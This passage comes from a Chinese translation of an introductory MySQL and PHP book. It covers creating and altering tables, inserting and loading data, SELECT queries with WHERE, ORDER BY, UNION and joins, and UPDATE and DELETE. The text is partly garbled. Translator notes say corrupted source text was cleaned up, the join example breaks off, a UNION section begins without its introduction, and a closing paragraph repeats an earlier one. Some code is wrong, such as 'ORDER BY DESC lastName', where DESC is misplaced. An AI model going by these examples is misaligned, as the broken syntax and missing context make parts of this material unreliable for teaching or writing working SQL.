  \n```sql\nCREATE TABLE tablename (\n    column1 definition1,\n    column2 definition2,\n\
  \    ...,\n    PRIMARY KEY (column1, column2)\n)\n```\n\n列表 3-1 中的 `CREATE TABLE`\
  \ 语句显示了用于创建 Customer 表的语句。\n\n列表 3-1：创建表的 语句\n\n```sql\nCREATE TABLE Customer (\n\
  \    CustomerID SERIAL,\n    lastName VARCHAR(50),\n    firstName VARCHAR(40),\n\
  \    street VARCHAR(50),\n    city VARCHAR(50),\n    state CHAR(2),\n    zip CHAR(10),\n\
  \    email VARCHAR(50),\n    phone CHAR(15),\n    fax CHAR(15),\n    PRIMARY KEY(CustomerID)\n\
  );\n```\n\n注意，列表 3-1 中的列名列表封装在括号内（第一行和最后一行各一个），每个列定义后面都有一个逗号。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 记住不要在列名中使用任何 MySQL 保留字，正如在本章较早之前的组织数据 节中所讨论的。如果你在列名中使用保留字，MySQL 会给你一个类似下面的错误消息：\n\
  \n`You have an error in your SQL syntax near 'order var(20))' at line 1`\n\n此错误消息显示了它不喜欢的列定义以及它发现该冲突定义的行。然而，该消息并没有告诉你关于问题到底是什么。它所指的\
  \ `error in your SQL syntax` 是将 MySQL 保留字 `order` 用作列名。\n\n如果你尝试创建一个已经存在的表，你会收到错误消息。你可以通过使用以下\
  \ `CREATE` 语句防止此错误消息出现：\n\n```sql\nCREATE TABLE IF NOT EXISTS tablename\n```\n\n\
  \n\n\n\n# 表\n\n如果表不存在，该语句将创建它。如果表已经存在，该语句不会创建它，但也不会返回错误信息。\n\n你可以按照如下方式创建一个与现有表完全相同（结构相同）的新表：\n\
  \n```\nCREATE TABLE `tablename` LIKE `oldtablename`\n```\n\n新表 `tablename` 将根据与\
  \ `oldtablename` 相同的字段和定义创建。即使旧表中包含数据，新表也不包含这些数据，仅包含结构。\n\n在创建表之后，你可以通过查询来查看它、检查其结构或将其删除。\n\
  \n![check](img/check.png) 要查看已添加到数据库的表，请使用此查询：\n\n```\nSHOW TABLES\n```\n\n![check](img/check.png)\
  \ 要查看某个某个表的结构，请使用此查询：\n\n```\nEXPLAIN `tablename`\n```\n\n## 删除表\n\n你可以删除一个表，无论它是空的还是包含数据的。在操作之前，务必确保你确定要删除该表。\n\
  \n![warning_bomb.eps](img/warning_bomb_fmt.png) 删除表是不可逆的操作。删除一个表后，该表将永久消失。该表中的任何数据也将随之消失。\n\
  \n要删除任何表，请使用此语句：\n\n```\nDROP TABLE `tablename`\n```\n\n## 修改数据库结构\n\n你的数据库并不是一成不变的。你可以更改任何表的名称；在任何表中添加、删除或重命名列；或者更改任一列的数据类型或其他属性。\n\
  \n更改数据库并不是罕见发生的事情。你可能因为许多原因想要更改数据库。例如，假设你在一个包含公司所有员工姓名的数据库中定义了列 `lastName`，类型为 `VARCHAR(20)`。在当时，20\
  \ 个字符对于姓氏来说似乎足够了。但你刚刚收到一份备忘录，宣布新 CEO 是 John Schwartzheimer-Losertman。哎，MySQL 将把他的名字截断为前\
  \ 20 个字母：Schwartzheimer-Loser —— 这对老板来说可是一个并不理想的新名字。因此，你需要立即加宽该列。\n\n你可以使用 `ALTER`\
  \ 语句更改数据库结构。该语句的基本格式为 `ALTER TABLE` `tablename`，后跟指定的更改内容。表 3-7 显示了你可以进行的更改。\n\n\
  ### 表 3-7 使用 ALTER 语句可以更改\n\n| 更改 | 说明 |\n| :--- | :--- |\n| `ADD` `columnname`\
  \ `definition` | 添加列；`definition` 包含数据类型和可选定义。 |\n| `ALTER` `columnname` `SET DEFAULT`\
  \ `value` | 更改列的默认值。 |\n| `ALTER` `columnname` `DROP DEFAULT` | 列的默认值。 |\n| `CHANGE`\
  \ `columnname` `newcolumnname definition` | 更改列的定义并重命名；`definition` 包含数据类型和可选定义。\
  \ |\n| `DROP` `columnname` | 删除列，包括该列中的所有数据。数据无法恢复。 |\n| `MODIFY` `columnname` `definition`\
  \ | 更改列的定义；`definition` 包含数据类型和可选定义。 |\n| `RENAME` `newtablenam``e` | 重命名表。 |\n\n\
  例如，以下语句将 `Customer` 表重命名为 `NewCustomer`：\n\n```\nALTER TABLE Customer RENAME NewCustomer\n\
  ```\n\n另一个示例，以下语句将指定的列（`lastName`）更改为指定的数据类型（`VARCHAR`）和宽度（`50`）：\n\n```\nALTER\
  \ TABLE Customer MODIFY lastName VARCHAR(50)\n```\n\n# 第 4 章：使用数据库\n\n## 本章内容\n\n\
  - ![arrow.png](img/arrow.png) 在数据库中存储数据\n- ![arrow.png](img/arrow.png) 从数据库中查看和检索数据\n\
  - ![arrow.png](img/arrow.png) 更新数据\n- ![arrow.png](img/arrow.png) 删除数据\n\n空数据库就像一个空的饼干罐——你从中得不到任何东西。搜索空数据库并不比搜索空的饼干罐更有趣或更具成效。数据库只有在其所包含的信息方面才是有用的。\n\
  \n数据库需要能够接收信息进行存储，并根据请求交付信息。例如，前面的章节描述的 `CustomerOrderInformation` 数据库需要能够接收客户和订单信息，并在你请求时能够交付其存储的信息。例如，如果你想知道特定客户的地址或特定订单的创建日期，数据库需要在你请求时交付这些信息。\n\
  \n你的 MySQL 数据库响应四种类型的请求：\n\n- ![check](img/check.png) 添加信息：向表中添加一行。\n- ![check](img/check.png)\
  \ 检索信息：查看数据。此请求不会从数据库中删除数据。\n- ![check](img/check.png) 更新信息：更改现有行中的信息。这包括向现有行的空白字段中添加数据。\n\
  - ![check](img/check.png) 删除信息：从数据库中删除数据。\n\n你通过 SQL 语句和查询与数据库交互，如第 1 章中讨论。本章将解释如何使用\
  \ SQL 语句和查询来添加、更新和删除。\n\n## 向数据库添加信息\n\n每个数据库都需要数据。例如，你可能想添加数据以便用户查看。如果你的数据仍在纸上，你可以将其逐条输入\
  \ MySQL。但是，如果你有大量数据，这个过程可能会枯燥并涉及大量打字。假设你有 1000 个产品需要添加。假设你键盘很熟练，每分钟可以输入一行，那需要 16\
  \ 小时。另一方面，假设你需要向数据库输入 5000 个成员，且输入每个成员需要五分钟。现在你得花费 400 小时——谁有时间呢？\n\n如果你有大量数据要输入，请考虑一些替代方案。有时扫描数据是一种选择。或者你可能需要寻求帮助。在许多情况下，将数据输入文本文件比逐条输入\
  \ SQL 语句更快。\n\n![tip](img/tip_fmt.png) `LOAD` 语句可以从文本文件（甚至是小文本文件）读取数据。因此，如果你的数据已经在计算机文件中，你可以处理该文件；无需再次输入所有数据。即使数据不是文本文件格式（例如\
  \ Excel、Access 或 Oracle 文件），你通常也可以将其转换为文本文件，然后读入你的 MySQL 数据库。如果数据尚未在计算机文件中且量很大，先将数据输入文本文件再传输到\
  \ MySQL 可能会更快。\n\n大多数文本文件都可以被 MySQL 读取，但某些格式更易读。如果你计划将数据输入文本文件，请阅读添加大量数据节以找到最佳格式。当然，如果数据已经在计算机上，你必须按照原样处理该文件。\n\
  \n## 逐行添加\n\n如果你只有少量数据，可以一次向表添加一行。PHP 脚本通常需要逐行添加。\n\n\n\n\n\n你使用 `INSERT` 语句向数据库添加新行。该语句告诉\
  \ MySQL 要将行添加到哪个表中，以及该行中字段的值是什么。该语句的通用格式如下\n\n```\nINSERT INTO `tablename` (`columnname`,`columnname`,...,`columnname`)\n\
  VALUES (`value`,`value`,...,`value`)\n```\n\n以下规则适用于 `INSERT` 语句：\n\n![check](img/check.png)\
  \ 值的列表必须与列名列出的顺序相同。值列表中的第一个值插入到列列表中第一个命名的列中；值列表中的第二个值插入到第二个命名的列中；依此类推。\n\n![check](img/check.png)\
  \ 允许使用完整或部分列列表。你不需要列出所有列。未列出的列将赋予其默认值，或者在没有定义默认值的情况下留空。\n\n![!warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 记住，任何定义为 `NOT NULL` 的列都必须包含值，否则语句将失败。\n\n![check](img/check.png) 不强制要求提供列列表。如果你正在为所有列输入值，则完全不需要列出列。如果没有列出任何列，MySQL\
  \ 将按照它们在表中出现的顺序查找所有列的值。\n\n![check](img/check.png) 列列表和值列表必须一致。你必须为你列出的每个列提供值，否则你将收到类似这样的错误信息：`Column\
  \ count doesn't match value count`。\n\n以下 `INSERT` 语句向 `Customer` 表添加了一行：\n\n```\n\
  INSERT INTO Customer (lastName, street,city,state,zip,email,phone,fax)\nVALUES (\"\
  Contrary\",\"1234 Garden St\",\"Garden\",\"NV\",\"88888\",\"maryc@hergarden.com\"\
  ,\"(555) 555-5555\",\"\")\n```\n\n注意，`firstName` 未列在列名列表中。`firstName` 字段中没有输入任何值。如果\
  \ `firstName` 被定义为 `NOT NULL`，MySQL 将不会允许这样做。此外，如果 `firstName` 的定义包含默认值，则会输入默认值，但由于没有包含，该字段被留空。注意存储在\
  \ `fax` 中的值是一个空字符串。\n\n要查看你输入的数据并确保输入正确，请使用从数据库中检索数据的 SQL 查询。我们在本章稍后的从数据库中检索信息 部分中详细描述了这些\
  \ SQL 查询。简而言之，以下查询检索了 `Customer` 表中的所有数据：\n\n```\nSELECT * FROM Customer\n```\n\n\
  ### 添加大量数据\n\n如果你有大量数据需要输入，且数据已存在于计算机文件中，你可以将数据从现有计算机文件传输到你的 MySQL 数据库。由于数据库中的数据按行和列组织，因此被读取的文本文件必须指示每列数据的开始和结束位置，以及行的结束位置。以下是创建该表结构的方法：\n\
  \n![check](img/check.png) **列**：为了指示列，使用特定字符分隔每列的数据。默认情况下，MySQL 寻找制表符（tab）来分隔字段。但如果制表符对你的数据文件无效，你可以选择不同的字符来分隔字段，并告诉\
  \ MySQL 使用不同制表符的字符来分隔字段。\n\n![check](img/check.png) **行**：同样默认情况下，行尾被认为是行的结束——尽管如果你有需要，可以选择一个字符来指示行的结束。一个\
  \ `Inventory` 表的数据文件可能如下所示：\n\n```\nRock<TAB>Classic<TAB>Steely Dan<Tab>Aja<Tab>10.99\n\
  RockTAB>Pop<TAB>Semisonic<Tab>All About Chemistry<Tab>11.99\nRock<TAB>Classic<TAB>Beatles<TAB>Abbey\
  \ Road<Tab>9.99\n```\n\n字段之间带有制表符的数据文件是制表符分隔文件。另一种常见格式是逗号分隔文件，用逗号分隔字段。如果你的数据在其他文件格式中，你需要将其转换为分隔文件。\n\
  \n![!tip.eps](img/tip_fmt.png) 要将另一个软件的文件格式的数据转换为分隔文件，请检查该软件的手手册，或咨询了解数据当前格式的当地专家。许多程序（如\
  \ Excel、Access 和 Oracle）都允许你将数据输出到分隔文件中。对于文本文件，你可能可以通过使用编辑器或文字处理器的“查找并替换”功能将其转换为分隔格式。对于真正棘手的文件，你可能需要寻求专家或经验丰富的程序员的帮助。\n\
  \n你可以通过在数据文件中包含字段分隔符但不包含任何数据来留空字段。如果该字段未被定义为 `NOT NULL`，则该字段为空。如果该字段被定义为 `NOT NULL`，加载数据文件将失败并返回错误信息。如果其中一个字段是\
  \ `AUTO_INCREMENT` 字段（例如 `SERIAL` 字段），你可以留空，MySQL 将插入 `AUTO_INCREMENT` 值。例如，以下数据文件包含要加载到\
  \ `Customer` 表的数据：\n\n```\n,Smith,John,Austin,TX,88888\n,Contrary,Mary,Garden,NV,99999\n\
  ,Jack,,,\n```\n\n此数据文件是逗号分隔的。每行以逗号开头，为第一个字段留空，该字段是 `SERIAL`。在加载数据文件后，数据库中的其他字段也将为空。\n\
  \n\n\n\n要查看你加载的数据——以确保其正确性——请使用 SQL 查询从数据库中检索数据。我们将在下一节中详细描述这些类型的 SQL 查询。简而言之，使用以下查询查看表中的所有数据，以便你进行检查：\n\
  \n```\nSELECT * FROM Customer\n```\n\n# 查看数据库中的数据\n\n在数据输入数据库后，你可能想要浏览这些数据，以查看输入的数据看起来是否正确，或者了解数据库中包含什么类型的数据。你还可以通过浏览数据来确定有关数据库的简单信息，例如它包含多少条记录。\n\
  \n你可以使用以下查询查看表中的所有数据：\n\n```sql\nSELECT * FROM tablename\n```\n\n此查询从表中获取所有数据。你可以通过浏览输出结果来发现表中有多少条记录，并对数据有一个大致的了解。\n\
  \n你可以使用以下查询确切地查看表中到底有多少条记录：\n\n```sql\nSELECT COUNT(*) FROM tablename\n```\n\n此查询输出表中所包含的记录数。\n\
  \n# 从数据库中检索信息\n\n存储信息的唯一目的是为了在你需要时可以使用它。数据库的生存是为了回答问题。例如：有哪些产品在销售？客户是谁？印第安纳州住着多少位客户？客户买了什么？\n\
  \n许多问题可以通过从数据库中检索数据来回答。例如，要找出印第安纳州住着多少客户，你可以检索所有名为 `state` 的字段包含 `IN` 的客户记录。很多时候，你会在\
  \ PHP 脚本中提出这类问题，并在网页上显示答案。在 PHP 脚本中，你可能会检索所有印第安纳客户的记录，并在网页上显示他们的姓名和地址列表。\n\n为了回答特定问题，你使用\
  \ `SELECT` 查询。你可以使用 `SELECT` 查询提出精确、复杂且详细的问题。最简单的 `SELECT` 查询是：\n\n```sql\nSELECT\
  \ * FROM tablename\n```\n\n此查询从表中检索所有所有信息。星号（`*`）是一个通配符，表示所有列。\n\n`SELECT` 查询可以更具选择性。`SELECT`\
  \ 查询中的 SQL 单词和短语可以定位回答你的问题所需的信息。以下是一些你可以让 `SELECT` 查询执行的技巧：\n\n![check](img/check.png)\
  \ 你可以请求回答你的问题所需的信息（列）。例如，你可以只请求姓和名来创建一个客户列表。\n\n![check](img/check.png) 你可以按照特定的顺序请求信息。例如，你可以请求信息按字母顺序排序。\n\
  \n![check](img/check.png) 你可以从表中选定的对象（行）中请求信息。例如，你可以只为那些地址在佛罗里达州的客户请求姓和名。\n\n我们将在后文中告诉你如何使用这些类型的查询。\n\
  \n![tip.eps](img/tip_fmt.png) 在 MySQL 4.1 中，MySQL 增加了在另一个查询中嵌套 `SELECT` 查询的能力。嵌套查询被称为子查询。你可以在\
  \ `SELECT`、`INSERT`、`UPDATE` 或 `DELETE` 语句中，或在 `SET` 子句中使用子查询。子查询可以返回单个值、单行或单列或一个表，并用于外部查询。`SELECT`\
  \ 查询的所有功能都可以在子查询中使用。请查看 MySQL 在线手册 http://dev.mysql.com/doc/refman/5.5/en/subqueries.html\
  \ 了解有关使用子查询的详细信息。\n\n## 检索特定信息\n\n要检索特定信息，列出包含你所需信息的列。例如：\n\n```sql\nSELECT columnname,columnname,columnname,...\
  \ FROM tablename\n```\n\n此查询从指定列的所有行中检索值。例如，以下查询从存储在 `Customer` 表的 `lastName` 和\
  \ `firstName` 列中检索所有的姓和：\n\n```sql\nSELECT lastName,firstName FROM Customer\n```\n\
  \n在选择列时，你可以对列进行数学运算。例如，你可以使用以下 `SELECT` 查询来相加两个列：\n\n```sql\nSELECT col1 + col2\
  \ FROM tablename\n```\n\n或者你可以使用以下查询：\n\n```sql\nSELECT price,price*1.08 FROM Inventory\n\
  ```\n\n结果是价格以及加上了 8% 销售税后的价格。你可以在选择列时更改列名，如下：\n\n```sql\nSELECT price,price*1.08\
  \ AS priceWithTax FROM Inventory\n```\n\n`AS` 子句告诉 MySQL 给检索到的第二列命名为 `priceWithTax`。因此，查询检索了两个列的数据：`price`\
  \ 和 `priceWithTax`。\n\n在某些情况下，你不想看到列中的值，但你想了解有关该列的某些信息。例如，你可能想知道列中的最低值或最高值。表 4-1\
  \ 列出了关于列的某些可用信息。\n\n### 表 4-1 可被选择的信息\n\n| SQL 格式 | 信息描述 |\n| :--- | :--- |\n| `AVG(columnname)`\
  \ | 返回 `columnname` 中所有值的平均值 |\n| `COUNT(columnname)` | 返回 `columnname` 不空的行数 |\n\
  | `MAX(columnname)` | 返回 `columnname` 的最大值 |\n| `MIN(columnname)` | 返回 `columnname`\
  \ 的最小值 |\n| `SUM(columnname)` | 返回 `columnname` 值的总和 |\n\n例如，查询 `Inventory` 中最大值的查询是\n\
  \n```sql\nSELECT MAX(price) FROM Inventory\n```\n\n像 `MAX()` 和 `SUM()` 这样带有括号的 SQL\
  \ 单词是函数。除了 表 4-1 中提到的之外，SQL 还提供了许多函数。这些函数会改变所选的值。例如，`SQRT()` 返回每个值的平方根，`DAYNAME()`\
  \ 返回每个日期的星期名称，而不是实际日期。有 100 多个函数可用于 `SELECT` 查询。有关所有函数的描述，请查看 MySQL 在线手册 http://dev.mysql.com/doc/refman/5.5/en/functions.html。\n\
  \n# 按特定顺序检索数据\n\n你可能希望特定顺序检索数据。例如，在 `Customer` 表中，你可能希望按字母顺序组织客户。或者，在 `Inventory`\
  \ 表中，你可能希望按类别分组。\n\n在 `SELECT` 查询中，`ORDER BY` 和 `GROUP BY` 影响数据的交付顺序：\n\n![check](img/check.png)\
  \ `ORDER BY`：为了排序，在你的 `SELECT` 查询中添加此短语：\n\n```sql\nORDER BY columnname\n```\n\n\
  数据按 `columnname` 升序排列。例如，如果 `columnname` 是 `lastName`，数据将按姓字母顺序交付给你。\n\n你可以在列名前添加\
  \ `DESC` 来降序排序。例如：\n\n```sql\nSELECT * FROM Customers ORDER BY DESC lastName\n```\n\
  \n![check](img/check.png) `GROUP BY`：为了分组信息，使用以下短语：\n\n```sql\nGROUP BY columnname\n\
  ```\n\n具有相同 `columnname` 值的行将被分组。例如，使用此查询对具有相同 `Category` 值的行分组：\n\n```sql\nSELECT\
  \ * FROM Inventory GROUP BY Category\n```\n\n你可以在同一个查询中使用 `GROUP BY` 和 `ORDER BY`。\n\
  \n## 从特定行检索数据\n\n通常，你并不想要表中的所有信息。你只想从选定的行获取信息。有三个 SQL 单词经常指定信息的来源：\n\n\n\n\n\n![check](img/check.png)\
  \ `WHERE`：允许你从具有特定特征的数据库对象请求信息。例如，你可以请求住在加利尼亚州的客户姓名，或者只列出属于某一类衣服的产品。\n\n![check](img/check.png)\
  \ `LIMIT`：允许你限制从表中检索信息的行数。例如，你可以只请求表中前三行的数据信息。\n\n![check](img/check.png) `DISTINCT`：允许你仅从完全相同的行中请求一次信息。例如，在\
  \ `Login`（登录）表中，你可以请求 `loginName` 但指定不出现重复的名称，从而将响应限制为每个成员一条记录。这将回答“客户是否曾经登录过？”这个问题，而不是“客户登录了多少次？”这个问题。\n\
  \n## 使用 WHERE 子句\n\n`SELECT` 查询的 `WHERE` 子句允许你进行复杂的选择。例如，假设你的老板想知道所有姓氏以 B 开头、居住在印第纳利斯（Indianapolis），且电话号码或传真号码中包含数字\
  \ 8 的客户。（我们相信这样的列表有很多用途。）你可以通过一个带有 `WHERE` 子句的 `SELECT` 查询为老板获取这个列表。\n\n`WHERE`\
  \ 子句的基本格式为：\n\n`WHERE` `expression` `AND|OR` `expression` `AND|OR` `expression`\
  \ `...`\n\n`expression` 指定了一个用于与数据库中存储的值进行比较的值。只有包含与表达式匹配的行才会被选中。你可以根据需要使用任意表达式，每个表达式由\
  \ `AND` 或 `OR` 分隔。当你使用 `AND` 时，由 `AND` 连接的两个表达式（即 `AND` 之前的表达式和 `AND` 之后的表达式）都必须为真，该行才会被选中。当你使用\
  \ `OR` 时，只要由 `OR` 连接的表达式中有一个为真，该行就会被选中。\n\n常见的表达式见表 4-2 。\n\n### 表 4-2 用于 WHERE\
  \ 子句的表达式\n\n| 表达式 | 示例 | 结果 |\n| :--- | :--- | :--- |\n| `column` `=` `value` |\
  \ `zip=\"12345\"` | 仅选择名为 `zip` 的列中存储 12345 的行 |\n| `column` `>` `value` | `zip\
  \ > \"50000\"` | 仅选择邮政编码为 50001 或更高的行 |\n| `column` `>=` `value` | `zip >= \"50000\"\
  ` | 仅选择邮政编码为 50000 或更高的行 |\n| `column` `<` `value` | `zip < \"50000\"` | 仅选择邮政编码为\
  \ 49999 或更低的行 |\n| `column` `<=` `value` | `zip <= \"50000\"` | 仅选择邮政编码为 50000 或更低的行\
  \ |\n| `column` `BETWEEN` `value1` `AND` `value2` | `zip BETWEEN \"20000\" AND \"\
  30000\"` | 仅选择邮政编码大于 19999 且小于 30001 的行 |\n| `column` `IN (value1,value2...)` |\
  \ `zip IN (\"90001\",\"30044\")` | 仅选择邮政编码为 90001 或 30044 的行 |\n| `column` `NOT\
  \ IN (value1,value2...)` | `zip NOT IN (\"90001\",\"30044\")` | 仅选择邮政编码除 90001 或\
  \ 30044 以外的所有邮行 |\n| `column` `LIKE` `value` | `zip LIKE \"9%\"` | 选择所有邮政编码以 9 开头的行\
  \ |\n| `column` `NOT LIKE` `value` | `zip NOT LIKE \"9%\"` | 选择所有邮政编码不以 9 开头的行 |\n\
  \n你可以将表 4-2 中的任何表达式与 `AND` 和 `OR` 结合。在某些情况下，你需要使用括号来明确选择范围。例如，你可以使用以下查询找到所有姓以 B\
  \ 开头、居住在印第纳利斯，且电话号码或传真号码中包含 8 的客户：\n\n```\nSELECT lastName,firstName FROM Customer\n\
  WHERE lastName LIKE \"B%\"\nAND city = \"Indianapolis\"\nAND (phone LIKE \"%8%\"\
  \ OR fax LIKE \"%8%\")\n```\n\n注意最后一行中的括号。如果没有括号，你将无法获得所需的结果。如果没有括号，每个连接符将从第一个到最后一个顺序进行处理，导致生成的列表包含：所有姓以\
  \ B 开头且居住在印第纳利斯且电话号码包含 8 的客户，以及所有传真号码包含 8 的客户（无论他们是否住在印第纳利斯，无论他们的姓氏是否以 B 开头）。当处理最后一个\
  \ `OR` 时，将选取其特征符合 `OR` 之前或之后表达式的客户。\n\n\n\n\n结果集包含第一个查询的所有行，紧随其的是第二个查询的所有行，依此类推。结果集中使用的列名是第一个\
  \ `SELECT` 查询中选定的列名。\n\n一系列 `SELECT` 查询可以从同一张表中选择不同的列，但如果你希望在一个新表中先是该表的一列列，紧接着是该表的另一列，这种这种情况是不寻常的。更有可能的情况是你想要组合不同表中的列。例如，你可能有一个存储退会俱乐部成员的表（`OldMember`）和一个存储当前成员的独立表（`Member`）。你可以通过以下查询获取所有成员（包括当前和退会成员）的列表：\n\
  \n```sql\nSELECT lastName,firstName FROM Member UNION ALL\n      SELECT lastName,firstName\
  \ FROM OldMember\n```\n\n该查询的结果是所有当前成员的姓和名，紧随其的是所有退会成员的姓和名。\n\n取决于你组织数据的方式，可能会出现重复的名字。例如，可能某个成员退会了，他的名字在\
  \ `OldMember` 表中——但他又重新加入了，所以他的名字被添加到了 `Member` 表中。如果你不想要重复项，请不要包含 `ALL` 单词。如果不包含\
  \ `ALL`，重复行就不会被添加到结果集中。\n\n你可以在每个 `SELECT` 查询中使用 `ORDER BY`，正如我们在本章较早的按特定顺序检索数据\
  \ 部分中讨论的那样；或者你可以在 `UNION` 查询中使用 `ORDER BY` 对结果集中的所有行进行排序。如果你希望 `ORDER BY` 应用于整个结果集，而不仅仅适用于其后的查询，请像所示使用括号：\n\
  \n```sql\n(SELECT lastName FROM Member UNION ALL\n      SELECT lastName FROM OldMember)\
  \ ORDER BY lastName\n```\n\n# 连接 (Join)\n\n将表并排组合被称为“连接”。表通过匹配某一列中的数据（即它们共有的列）来组合。由连接产生的组合结果表包含两个表的所有列。例如，如果\
  \ `table1` 有两列（`memberID` 和 `height`），而 `table2` 有两列（`memberID` 和 `weight`），则连接将产生一个具有四列的表：`memberID`（来自\
  \ `table1`）、`height`、`memberID`（来自 `table2`）和 `weight`。\n\n两种常见的连接类型内连接（inner join）和外连接（outer\
  \ join）。内连接和外连接的区别在于结果表中包含的行数。\n\n![check](img/check.png) 内连接：内连接产生的结果表仅包含在两个表中都存在的行。\n\
  \n![check](img/check.png) 外连接：外连接产生的组合表包含于一个表中所有的行，对于在第二个表中不存在的行，其列将留空。\n\n例如，如果\
  \ `table1` 包含一行 Joe 的数据一行 Sally 的数据，而 `table2` 仅包含一行 Sally 的数据，那么内连接将只包含一行：即 Sally\
  \ 的行。然而，外连接将包含两行——Joe 的行和 Sally 的行——尽管 Joe 的行在 `weight` 字段上是空白。\n\n外连接的结果表包含一个表的所有行。如果该表的任何行在第二个表中都不存在，则第二个表的列将为空。显然，结果表的内容取决于哪一个表贡献了其所有行，这需要第二个表来匹配它。两种外连接控制着由哪张表设置行以及哪张表必须匹配：`LEFT\
  \ JOIN`（左连接）和 `RIGHT JOIN`（右连接）。\n\n你为内连接和两种类型的外连接使用不同的 `SELECT` 查询。以下查询是一个内连接：\n\
  \n```sql\nSELECT columnnamelist FROM table1,table2\nWHERE table1.col2 = table2.col2\n\
  ```\n\n而这些查询是外连接：\n\n```sql\nSELECT columnnamelist FROM table1 LEFT JOIN table2\n\
  ON table1.col1=table2.col2\n\nSELECT columnnamelist FROM table1 RIGHT JOIN table2\n\
  ON table1.col1=table2.col2\n```\n\n在所有三个查询中，`table1` 和 `table2` 是要连接的表。你可以连接两个以上的表。在查询中，`col1`\
  \ 和 `col2` 是用于匹配连接表的列名。表根据这些列中的数据进行匹配。这两列可以有相同的名称也可以有不同的名称，但它们必须包含相同类型的数据。\n\n作为内连接和外连接的示例，考虑一个包含两个表的服装目录。一张表是\
  \ `Product`，两列 `Name` 和 `Type` 包含以下数据：\n\n```text\nName          Type\nT-shirt \
  \     Shirt\nDress shirt  Shirt\nJeans         Pants\n```\n\n第二张表是 `Color`，两列 `Name`\
  \ 和 `Color` 包含以下数据：\n\n```text\nName          Color\nT-shirt      White\nDress shirt\
  \  Red\nJeans         Black\n```\n\n（注：原文后续部分存在大量重复和损坏的文本，已根据逻辑要求进行清理，仅保留核心说明内容。）\n\
  \n# 更新数据库中的信息\n\n更改现有行中的信息就是更新信息。例如，你可能需要因为客户搬家而更改她的地址，或者你可能需要添加一个客户在最初输入信息时留空的传真号。\n\
  \n`UPDATE` 语句是直观的：\n\n\n\n\n`UPDATE tablename SET column=value,column=value,...`\
  \ \n`WHERE 子句`\n\n在 `SET` 子句中，你列出要更新的列和要插入的新值。在一条语句中列出所有你想要更改的列。如果没有 `WHERE` 子句，所有行中的列值都将被更改。但如果有了\
  \ `WHERE` 子句，你可以指定要更新哪些行。例如，要更新 `Customer` 表中的地址，使用此语句：\n\n```sql\nUPDATE Customer\
  \ SET street=\"3423 RoseLawn\",\n                   phone=\"555-555-5555\"\n   \
  \                WHERE lastName=\"Contrary\"\n```\n\n# 从数据库中删除信息\n\n通过删除过时信息来使你数据库中的信息保持最新。然而，在删除信息时要非常小心。一旦你删除了数据，它就会永远消失。它无法恢复。只有当你重新输入所有内容时，你才能找回它。\n\
  \n你可以从表中删除一行或一列，也可以删除整个表或整个数据库并重新开始。\n\n你可以使用 `DELETE` 语句从表中删除一行：\n\n```sql\nDELETE\
  \ FROM tablename WHERE clause\n```\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 使用 `DELETE` 时要极其小心。如果你使用不带 `WHERE` 子句的 `DELETE` 语句，它将删除表中的所有数据。我们指的是所有数据。重复一遍，所有数据。这些数据无法恢复。`DELETE`\
  \ 语句的这一功能位于我们“不要在家里尝试”列表的最顶端。\n\n你可以通过 `ALTER` 语句从表中删除一列：\n\n```sql\nALTER TABLE\
  \ tablename DROP columnname\n```\n\n你可以使用以下命令删除整个表或数据库：\n\n```sql\nDROP TABLE tablename\n\
  ```\n\n或者\n\n```sql\nDROP DATABASE databasename\n```\n\n# 第 5 章：通过 PHP 脚本与数据库通信\n\
  \n### 本章\n\n* ![arrow.png](img/arrow.png) 使用 PHP 内置函数访问 MySQL\n* ![arrow.png](img/arrow.png)\
  \ 向 MySQL 服务器发送 SQL 查询\n* ![arrow.png](img/arrow.png) 理解如何处理 MySQL 错误\n* ![arrow.png](img/arrow.png)\
  \ 使用其他有用函数\n* ![arrow.png](img/arrow.png) 将函数从 mysqli 更改为 mysql\n\nPHP 和 MySQL 协作良好，这种动态的伙伴关系使得\
  \ PHP 和 MySQL 对 Web 数据库应用开发极具吸引力。无论你是有一个充满了想要向用户提供的信息的数据库（例如产品目录），还是一个等待用户填充的数据库（例如客户数据库），PHP\
  \ 和 MySQL 都会共同工作来实现你的应用程序。\n\n本章描述了如何从 PHP 脚本访问 MySQL。\n\n## 了解 MySQL 和 PHP 如何协同工作\n\
  \n你通过向 MySQL 服务器传递消息来与数据库交互。正如本微型书第 1 章 中所示，这些消息是用 SQL 语言编写的，SQL 是一种大多数数据库管理系统都能理解的标准计算机语言。\n\
  \nPHP 不懂 SQL，但它不需要懂：PHP 只需要与 MySQL 服务器建立连接，并通过该连接发送 SQL 消息。MySQL 服务器解释 SQL 消息，遵循指令，并发送返回消息，说明其状态以及执行了什么（如果无法理解或遵循指令，则报告错误）。\n\
  \nPHP 语言提供了让与 MySQL 通信变得极其简单的函数。你使用 PHP 函数向数据库发送 SQL 查询。你不需要了解与 MySQL 通信的细节；PHP\
  \ 会处理这些细节。你只需要知道 SQL 查询以及如何使用 PHP 函数。\n\n我们在本微型书的第 1 章 中描述了 SQL 查询的通用语法。具体的各个查询将在我们描述如何使用\
  \ MySQL 实现特定目的的地方进行详细阐述。例如，我们在本微型书的第 2 章 中描述了如何创建 MySQL 账户，因此创建账户的 SQL 查询将在该位置进行描述。另一方面，我们在本微型书的第\
  \ 4 章 中描述了如何从 MySQL 数据库中检索数据，因此用于该目的的 SQL 查询将在该章节中进行详细描述。\n\n## 用于与 MySQL 通信的 PHP\
  \ 函数\n\nPHP 提供了两组用于与 MySQL 通信的函数——`mysql` 函数和 `mysqli`（MySQL Improved）函数。你使用哪些函数取决于你正在使用的\
  \ MySQL 和 PHP 版本。\n\n`mysqli` 函数是在 PHP 5 中添加的，用于适用于 4.1 及更高版本的 MySQL。如果你正在使用 Web\
  \ 托管……（此处原文内容似乎有重复或错误，已根据上下文调整翻译逻辑）。\n\nPHP 不懂 SQL，但它不需要懂：PHP 只需要与 MySQL 服务器建立连接，并通过该连接发送\
